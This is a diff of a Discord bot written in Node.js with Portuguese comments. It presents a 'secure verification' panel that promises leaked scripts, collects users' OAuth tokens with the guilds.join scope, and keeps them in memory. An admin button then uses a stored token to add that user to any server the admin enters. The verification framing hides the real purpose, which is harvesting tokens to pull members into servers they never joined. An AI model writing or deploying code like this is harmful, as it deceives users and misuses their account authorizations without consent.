@@ -7,20 +7,15 @@ const {
     TextInputStyle, PermissionsBitField 
 } = require('discord.js');
 
-// --- VARIÁVEIS DE CONFIGURAÇÃO ---
-// Canal onde o bot vai avisar que alguém se registrou (O Log)
-// Substitua pelo ID do CANAL de logs dentro do servidor 1443598173024288881
+// --- CONFIGURAÇÕES ---
 const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
+const REDIRECT_TARGET = 'https://discordapp.com/channels/1430240815229305033'; // Link para onde o usuário volta
 
 const app = express();
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
-
-// BANCO DE DADOS TEMPORÁRIO (Memória)
-// Guarda o token do usuário: Map<UserID, AccessToken>
-// Aviso: Se o bot reiniciar na hospedagem, esses tokens somem.
 const userTokens = new Map();
 
-// --- SERVIDOR WEB (Recebe o Login) ---
+// --- SERVIDOR WEB ---
 app.get('/', (req, res) => res.send('Auth Manager Online 🟢'));
 
 app.get('/callback', async (req, res) => {
@@ -42,7 +37,7 @@ app.get('/callback', async (req, res) => {
             { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
         );
 
-        const { access_token, refresh_token } = tokenResponse.data;
+        const { access_token } = tokenResponse.data;
 
         // 2. Pega dados do Usuário
         const userResponse = await axios.get('https://discord.com/api/users/@me', {
@@ -51,10 +46,10 @@ app.get('/callback', async (req, res) => {
 
         const user = userResponse.data;
 
-        // 3. Salva o Token na memória vinculado ao ID do usuário
+        // 3. Salva Token na Memória
         userTokens.set(user.id, access_token);
 
-        // 4. Envia o LOG para o canal de Admin
+        // 4. Envia LOG para o Admin
         const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
         if (logChannel) {
             const embedLog = new EmbedBuilder()
@@ -62,15 +57,14 @@ app.get('/callback', async (req, res) => {
                 .setThumbnail(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`)
                 .addFields(
                     { name: 'Usuário', value: `${user.username} (${user.id})`, inline: true },
-                    { name: 'Status', value: '🟢 Token Salvo (Pronto para mover)', inline: true }
+                    { name: 'Status', value: '🟢 Token Salvo', inline: true }
                 )
                 .setColor(0x00FF00)
-                .setFooter({ text: 'Aguardando comando de envio...' });
+                .setFooter({ text: 'Aguardando envio...' });
 
-            // Botão que carrega o ID do usuário no customId
             const row = new ActionRowBuilder().addComponents(
                 new ButtonBuilder()
-                    .setCustomId(`btn_abrir_envio_${user.id}`) // Guarda o ID aqui
+                    .setCustomId(`btn_abrir_envio_${user.id}`)
                     .setLabel('Enviar para um Servidor')
                     .setStyle(ButtonStyle.Primary)
                     .setEmoji('✈️')
@@ -79,30 +73,96 @@ app.get('/callback', async (req, res) => {
             await logChannel.send({ embeds: [embedLog], components: [row] });
         }
 
-        // 5. Resposta para o Usuário no Navegador
+        // 5. RESPOSTA VISUAL BONITA (HTML/CSS)
         res.send(`
-            <html>
-                <body style="background-color: #2b2d31; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
-                    <h1>✅ Verificado!</h1>
-                    <p>Você foi autenticado. Pode fechar esta janela.</p>
-                </body>
+            <!DOCTYPE html>
+            <html lang="pt-br">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Verificado com Sucesso</title>
+                <style>
+                    body {
+                        background-color: #2b2d31; /* Cor de fundo do Discord */
+                        font-family: 'gg sans', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                        color: white;
+                        display: flex;
+                        justify_content: center;
+                        align-items: center;
+                        height: 100vh;
+                        margin: 0;
+                        flex-direction: column;
+                    }
+                    .card {
+                        background-color: #313338;
+                        padding: 40px;
+                        border-radius: 10px;
+                        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+                        text-align: center;
+                        max-width: 400px;
+                        width: 90%;
+                    }
+                    .icon {
+                        font-size: 60px;
+                        color: #23a559; /* Verde Discord */
+                        margin-bottom: 20px;
+                    }
+                    h1 { margin: 0 0 10px 0; font-size: 24px; }
+                    p { color: #b5bac1; margin-bottom: 30px; }
+                    .btn {
+                        background-color: #5865F2; /* Blurple Discord */
+                        color: white;
+                        padding: 12px 24px;
+                        text-decoration: none;
+                        border-radius: 5px;
+                        font-weight: bold;
+                        transition: background 0.2s;
+                        display: inline-block;
+                    }
+                    .btn:hover { background-color: #4752c4; }
+                    .timer { margin-top: 20px; font-size: 12px; color: #949ba4; }
+                </style>
+            </head>
+            <body>
+                <div class="card">
+                    <div class="icon">✅</div>
+                    <h1>Verificado!</h1>
+                    <p>Sua conta foi autenticada com sucesso. Você já pode fechar esta janela.</p>
+                    
+                    <a href="${REDIRECT_TARGET}" class="btn">Voltar ao Servidor</a>
+                    
+                    <div class="timer">Redirecionando automaticamente em <span id="count">3</span>s...</div>
+                </div>
+
+                <script>
+                    let seconds = 3;
+                    const countSpan = document.getElementById('count');
+                    
+                    const interval = setInterval(() => {
+                        seconds--;
+                        countSpan.innerText = seconds;
+                        if (seconds <= 0) {
+                            clearInterval(interval);
+                            window.location.href = "${REDIRECT_TARGET}";
+                        }
+                    }, 1000);
+                </script>
+            </body>
             </html>
         `);
 
     } catch (error) {
         console.error(error);
-        res.send('❌ Erro na autenticação.');
+        res.send('<h1 style="color:red; text-align:center; font-family: sans-serif; margin-top: 50px;">❌ Erro na verificação.</h1>');
     }
 });
 
 app.listen(process.env.PORT || 3000);
 
-
 // --- BOT DISCORD ---
 client.once('ready', async () => {
-    console.log(`🤖 Manager Bot Online: ${client.user.tag}`);
+    console.log(`🤖 Bot Logado: ${client.user.tag}`);
     
-    // Registra o comando de Setup
     const guildId = process.env.MAIN_GUILD;
     if(guildId) {
         const guild = client.guilds.cache.get(guildId);
@@ -117,79 +177,71 @@ client.once('ready', async () => {
 
 client.on('interactionCreate', async interaction => {
     
-    // 1. SETUP DO PAINEL (Onde o usuário clica)
+    // --- 1. COMANDO SETUP (TEXTO ATUALIZADO) ---
     if (interaction.isChatInputCommand() && interaction.commandName === 'setup_auth') {
         if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
 
         const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join`;
 
         const embed = new EmbedBuilder()
-            .setTitle('🛡️ Verificação de Segurança')
-            .setDescription('Clique no botão abaixo para se verificar e liberar seu acesso.')
-            .setColor(0x5865F2);
+            .setTitle('🔓 Liberação de Acesso')
+            .setDescription('Verifique-se para liberar **scripts vazados**, **projetos em desenvolvimento**, e muitas outras coisas, como **privilégio em sorteios**!\n\nClique no botão abaixo para autenticar sua conta.')
+            .setColor(0x5865F2)
+            .setImage('https://i.imgur.com/2K1Y8xX.png') // Você pode trocar por um banner seu se quiser
+            .setFooter({ text: 'Sistema Seguro de Verificação' });
 
         const row = new ActionRowBuilder().addComponents(
-            new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('🛡️')
+            new ButtonBuilder()
+                .setLabel('Verificar Agora')
+                .setStyle(ButtonStyle.Link)
+                .setURL(authUrl)
+                .setEmoji('✅')
         );
 
         await interaction.channel.send({ embeds: [embed], components: [row] });
         await interaction.reply({ content: 'Painel criado!', ephemeral: true });
     }
 
-    // 2. BOTÃO NO CANAL DE LOGS (Admin clica "Enviar")
+    // --- 2. ADMIN ENVIA O USUÁRIO ---
     if (interaction.isButton() && interaction.customId.startsWith('btn_abrir_envio_')) {
-        // Extrai o ID do usuário do botão
         const targetUserId = interaction.customId.split('_')[3];
 
-        // Cria o Modal (Janelinha para digitar o ID do servidor)
         const modal = new ModalBuilder()
-            .setCustomId(`modal_envio_${targetUserId}`) // Passa o ID do usuário pro Modal
+            .setCustomId(`modal_envio_${targetUserId}`)
             .setTitle('Enviar Usuário');
 
         const serverIdInput = new TextInputBuilder()
             .setCustomId('input_server_id')
             .setLabel("ID do Servidor Alvo")
-            .setPlaceholder("Cole o ID do servidor aqui (O BOT PRECISA ESTAR LÁ)")
+            .setPlaceholder("O BOT DEVE ESTAR LÁ")
             .setStyle(TextInputStyle.Short);
 
         modal.addComponents(new ActionRowBuilder().addComponents(serverIdInput));
         await interaction.showModal(modal);
     }
 
-    // 3. RESPOSTA DO MODAL (Faz a mágica acontecer)
     if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_envio_')) {
         const targetUserId = interaction.customId.split('_')[2];
         const targetServerId = interaction.fields.getTextInputValue('input_server_id');
 
         await interaction.deferReply({ ephemeral: true });
 
-        // Recupera o token da memória
         const accessToken = userTokens.get(targetUserId);
 
         if (!accessToken) {
-            return interaction.editReply('❌ **Erro:** O token desse usuário expirou ou o bot reiniciou. Peça para ele se verificar novamente.');
+            return interaction.editReply('❌ **Erro:** O token desse usuário expirou (bot reiniciou).');
         }
 
         try {
-            // Tenta adicionar o usuário no servidor escolhido
             await axios.put(
                 `https://discord.com/api/guilds/${targetServerId}/members/${targetUserId}`,
                 { access_token: accessToken },
-                { 
-                    headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } 
-                }
+                { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }
             );
-
-            await interaction.editReply(`✅ **Sucesso!** O usuário <@${targetUserId}> foi adicionado ao servidor ID: \`${targetServerId}\`.`);
-
+            await interaction.editReply(`✅ **Sucesso!** Usuário enviado para o servidor \`${targetServerId}\`.`);
         } catch (erro) {
-            console.error(erro.response ? erro.response.data : erro);
-            
-            let msgErro = 'Falha ao adicionar.';
-            if (erro.response && erro.response.status === 403) msgErro = '❌ **Erro 403:** O Bot não tem permissão nesse servidor ou o usuário foi banido de lá.';
-            if (erro.response && erro.response.status === 404) msgErro = '❌ **Erro 404:** Servidor não encontrado (O Bot está nele?).';
-            
-            await interaction.editReply(msgErro);
+            console.error(erro);
+            await interaction.editReply('❌ Falha ao adicionar. Verifique se o bot está no servidor alvo e tem permissão.');
         }
     }
 });
